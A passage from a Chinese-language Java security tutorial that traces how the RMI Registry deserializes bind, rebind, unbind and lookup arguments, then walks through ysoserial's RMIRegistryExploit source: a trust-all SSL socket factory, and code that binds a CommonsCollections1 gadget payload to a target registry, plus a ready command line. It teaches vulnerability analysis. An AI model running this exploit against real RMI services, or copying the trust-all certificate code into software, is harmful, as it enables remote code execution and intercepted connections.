                        ObjectOutput var98 = var2.getResultStream(true);
                        var98.writeObject(var97);
                        break;
                    } catch (IOException var92) {
                        throw new MarshalException("error marshalling return", var92);
                    }
                case 2:
                    try {  // look()方法
                        var10 = var2.getInputStream();
                        // readObject反序列化触发
                        var7 = (String)var10.readObject();
                    } catch (IOException var89) {
                        throw new UnmarshalException("error unmarshalling arguments", var89);
                    } catch (ClassNotFoundException var90) {
                        throw new UnmarshalException("error unmarshalling arguments", var90);
                    } finally {
                        var2.releaseInputStream();
                    }
                    var8 = var6.lookup(var7);
                    try {
                        ObjectOutput var9 = var2.getResultStream(true);
                        var9.writeObject(var8);
                        break;
                    } catch (IOException var88) {
                        throw new MarshalException("error marshalling return", var88);
                    }
                case 3:
                    try { // rebind()方法
                        var11 = var2.getInputStream();
                        //readObject反序列化触发
                        var7 = (String)var11.readObject();
                        var8 = (Remote)var11.readObject();
                    } catch (IOException var85) {
                        throw new UnmarshalException("error unmarshalling arguments", var85);
                    } catch (ClassNotFoundException var86) {
                        throw new UnmarshalException("error unmarshalling arguments", var86);
                    } finally {
                        var2.releaseInputStream();
                    }
                    var6.rebind(var7, var8);
                    try {
                        var2.getResultStream(true);
                        break;
                    } catch (IOException var84) {
                        throw new MarshalException("error marshalling return", var84);
                    }
                case 4:
                    try { //unbind()方法
                        var10 = var2.getInputStream();
                        //readObject反序列化触发
                        var7 = (String)var10.readObject();
                    } catch (IOException var81) {
                        throw new UnmarshalException("error unmarshalling arguments", var81);
                    } catch (ClassNotFoundException var82) {
                        throw new UnmarshalException("error unmarshalling arguments", var82);
                    } finally {
                        var2.releaseInputStream();
                    }
                    var6.unbind(var7);
                    try {
                        var2.getResultStream(true);
                        break;
                    } catch (IOException var80) {
                        throw new MarshalException("error marshalling return", var80);
                    }
                default:
                    throw new UnmarshalException("invalid method number");
                }
这里我们可以得知，Registry注册中心能够接收bind/rebind/unbind/look/list/请求，而在接收五类请求方法的时候，只有我们bind，rebind，unbind和look方法进行了反序列化数据调用readObject函数，可能导致直接触发了反序列化漏洞产生。
而我们往下跟踪这五类方法请求，发现也是在RegistryImpl_Stub中进行定义。
    public Remote lookup(String var1) throws RemoteException, NotBoundException {
            synchronized(this.bindings) {
                Remote var3 = (Remote)this.bindings.get(var1);
                if (var3 == null) {
                    throw new NotBoundException(var1);
                } else {
                    return var3;
                }
            }
        }
        public void bind(String var1, Remote var2) throws RemoteException, AlreadyBoundException, AccessException {
            checkAccess("Registry.bind");
            synchronized(this.bindings) {
                Remote var4 = (Remote)this.bindings.get(var1);
                if (var4 != null) {
                    throw new AlreadyBoundException(var1);
                } else {
                    this.bindings.put(var1, var2);
                }
            }
        }
        public void unbind(String var1) throws RemoteException, NotBoundException, AccessException {
            checkAccess("Registry.unbind");
            synchronized(this.bindings) {
                Remote var3 = (Remote)this.bindings.get(var1);
                if (var3 == null) {
                    throw new NotBoundException(var1);
                } else {
                    this.bindings.remove(var1);
                }
            }
        }
        public void rebind(String var1, Remote var2) throws RemoteException, AccessException {
            checkAccess("Registry.rebind");
            this.bindings.put(var1, var2);
        }
针对这个攻击场景，我们可以用ysoserial中的RMIRegistryExploit.java进行分析讲述，因为这块代码比较多，我将RMIRegistryExploit.java分为三个模块来讲解。
RMIRegistryExploit.java的常见使用命令如下：
    java -cp ysoserial-0.0.4-all.jar ysoserial.exploit.RMIRegistryExploit 目标地址 端口号 CommonsCollections1 "calc"
很多时候，我们都是直接使用上面这种命令来进行RMI漏洞服务测试，其实本质就是通过bind请求攻击RMI注册中心。我们先看看其模块代码来进行分析。
TrustAllSSL模块
    private static class TrustAllSSL implements X509TrustManager {
            private static final X509Certificate[] ANY_CA = {};
            public X509Certificate[] getAcceptedIssuers() { return ANY_CA; }
            public void checkServerTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }
            public void checkClientTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }
        }
        private static class RMISSLClientSocketFactory implements RMIClientSocketFactory {
            public Socket createSocket(String host, int port) throws IOException {
                try {
                    SSLContext ctx = SSLContext.getInstance("TLS");
                    ctx.init(null, new TrustManager[] {new TrustAllSSL()}, null);
                    SSLSocketFactory factory = ctx.getSocketFactory();
                    return factory.createSocket(host, port);
                } catch(Exception e) {
                    throw new IOException(e);
                }
            }
这段TrustAllSSL代码主要是进行SSL证书认证过程，我们不必深入研究理会。
main函数模块
    public static void main(final String[] args) throws Exception {
            // 接收参数，如目标ip地址，端口号和需要执行的命令。
            final String host = args[0];
            final int port = Integer.parseInt(args[1]);
            final String command = args[3];
            // 用于访问RMI注册表服务，返回远程调用对象
            Registry registry = LocateRegistry.getRegistry(host, port);
            final String className = CommonsCollections1.class.getPackage().getName() +  "." + args[2];
            // 通过class.forName()加载
            final Class payloadClass = (Class) Class.forName(className);
            // 测试RMI注册表是否为SSL连接，如果连接失败时升级到SSL连接的rmi请求
            try {
                registry.list();
            } catch(ConnectIOException ex) {
                registry = LocateRegistry.getRegistry(host, port, new RMISSLClientSocketFactory());
            }
            // 调用exploit函数
            exploit(registry, payloadClass, command);
        }
这段main函数主要为加载payload值 CommonsCollections1，然后我们使用exploit函数去调用。
    public static void exploit(final Registry registry,
                final Class payloadClass,
                final String command) throws Exception {
            new ExecCheckingSecurityManager().callWrapped(new Callable(){public Void call() throws Exception {
                // 获取payload进行命令执行
                ObjectPayload payloadObj = payloadClass.newInstance();
                Object payload = payloadObj.getObject(command);
                String name = "pwned" + System.nanoTime();
                // 创建动态代理，且变为Remote类型
                Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, payload), Remote.class);
                try {
                    // 使用bind方法请求调用remote对象
                    registry.bind(name, remote);
                } catch (Throwable e) {
                    e.printStackTrace();
                }
                Utils.releasePayload(payloadObj, payload);
                return null;
            }});
        }
这里我们得知，ysoserail中的RMIRegistryExploit.java使用了远程代理机制，通过sun.reflect.annotation.AnnotationInvocationHandler对remote对象进行封装，然后通过bind方法将我们的remote对象进行请求发送。如果对ysoserail远程代理机制不是很了解的，可以看下我上篇[JAVA安全基础（三）--java动态代理机制](https://xz.aliyun.com/t/9197 "JAVA安全基础（三）-- java动态代理机制")
## 小结
我们简单介绍了下RMI服务机制流程和ysoserial为例分析攻击RMI注册中心的场景，这仅仅只是针对RMI服务本身的攻击利用，后面更深入的还会结合JRMP和JDNI机制来进行分析讲解。如果文章有什么讲述不清或者文笔错误的话，欢迎大家指出。
## 参考链接